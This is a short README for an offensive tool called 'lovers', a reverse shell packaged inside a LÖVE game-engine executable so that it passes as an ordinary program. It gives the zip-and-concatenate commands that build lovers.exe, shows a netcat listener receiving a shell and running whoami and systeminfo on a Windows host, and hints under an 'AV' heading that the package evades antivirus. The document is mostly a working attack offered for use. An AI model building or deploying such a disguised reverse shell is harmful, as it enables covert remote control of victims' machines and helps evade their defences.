# lovers

portable LÖVE (basically packaged lua) reverse shell

https://love2d.org/

Using non-interactive lua reverse shell.
https://gtfobins.github.io/gtfobins/lua/

**Setup**

Deploy https://love2d.org/#download

```
zip -9 -r lovers.love main.lua
cat love.exe lovers.love > lovers.exe
```

```
WOPR@WOPR webassembly % nc -v -l 9999                            
whoami
windev1910eval\user
systeminfo

Host Name:                 WINDEV1910EVAL
OS Name:                   Microsoft Windows 10 Enterprise Evaluation
OS Version:                10.0.18362 N/A Build 18362
```

**AV**

Enjoy~
